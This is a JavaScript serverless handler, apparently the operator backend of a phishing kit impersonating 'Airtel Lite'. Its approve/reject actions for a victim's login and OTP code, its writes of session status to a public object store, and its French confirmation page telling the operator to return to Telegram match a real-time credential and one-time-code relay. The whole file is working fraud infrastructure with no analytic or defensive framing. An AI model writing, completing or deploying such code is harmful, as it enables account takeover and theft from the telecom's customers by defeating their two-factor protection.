const FETCH_HEADERS = {
  'Content-Type': 'application/json',
  'Accept': 'application/json',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
};

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  let id = '';
  let action = '';
  let sessionId = '';

  if (req.query && typeof req.query === 'object') {
    id = req.query.id || '';
    action = req.query.action || '';
    sessionId = req.query.sessionId || '';
  }

  if ((!id || !action) && req.url) {
    try {
      const parsedUrl = new URL(req.url, 'http://localhost');
      id = id || parsedUrl.searchParams.get('id') || '';
      action = action || parsedUrl.searchParams.get('action') || '';
      sessionId = sessionId || parsedUrl.searchParams.get('sessionId') || '';
    } catch {}
  }

  const targetId = id || sessionId;

  if (!targetId || !action) {
    return res.status(400).send('<h3>Paramètres manquants (id et action requis).</h3>');
  }

  try {
    let currentRecord = null;
    let isExisting = false;

    try {
      const fetchRes = await fetch(`https://api.restful-api.dev/objects/${targetId}`, {
        headers: FETCH_HEADERS,
        cache: 'no-store',
      });
      if (fetchRes.ok) {
        currentRecord = await fetchRes.json();
        isExisting = true;
      }
    } catch (e) {
      console.warn('Action lookup warning:', e);
    }

    const data = currentRecord?.data || {};

    let title = '';
    if (action === 'approve_login') {
      data.loginStatus = 'approved';
      title = '✅ Connexion client validée avec succès !';
    } else if (action === 'reject_login') {
      data.loginStatus = 'rejected';
      title = '❌ Connexion client refusée.';
    } else if (action === 'approve_otp') {
      data.otpStatus = 'approved';
      title = '✅ Code OTP validé avec succès !';
    } else if (action === 'reject_otp') {
      data.otpStatus = 'rejected';
      title = '❌ Code OTP rejeté.';
    }

    data.lastUpdated = Date.now();

    if (isExisting) {
      await fetch(`https://api.restful-api.dev/objects/${targetId}`, {
        method: 'PUT',
        headers: FETCH_HEADERS,
        body: JSON.stringify({
          name: currentRecord.name || targetId,
          data,
        }),
      });
    } else {
      await fetch(`https://api.restful-api.dev/objects`, {
        method: 'POST',
        headers: FETCH_HEADERS,
        body: JSON.stringify({
          name: targetId,
          data: {
            sessionId: targetId,
            ...data,
          },
        }),
      });
    }

    return res.status(200).send(`
      <!DOCTYPE html>
      <html>
        <head>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1">
          <title>Validation Airtel Lite</title>
          <style>
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0f172a; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; text-align: center; }
            .card { background: #1e293b; border-radius: 24px; padding: 32px 24px; max-width: 400px; width: 100%; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
            h2 { color: #10b981; margin-top: 0; font-size: 22px; }
            p { color: #94a3b8; font-size: 14px; line-height: 1.5; }
            .badge { display: inline-block; background: rgba(16, 185, 129, 0.15); color: #34d399; font-weight: bold; padding: 6px 14px; border-radius: 999px; font-size: 12px; margin-bottom: 16px; }
          </style>
        </head>
        <body>
          <div class="card">
            <div class="badge">Airtel Lite Security Gateway</div>
            <h2>${title}</h2>
            <p>L'action a été transmise en temps réel au client.<br>Vous pouvez fermer cette page et retourner sur Telegram.</p>
          </div>
        </body>
      </html>
    `);
  } catch (err) {
    return res.status(500).send(`<h3>Erreur lors de la validation: ${err.message}</h3>`);
  }
}
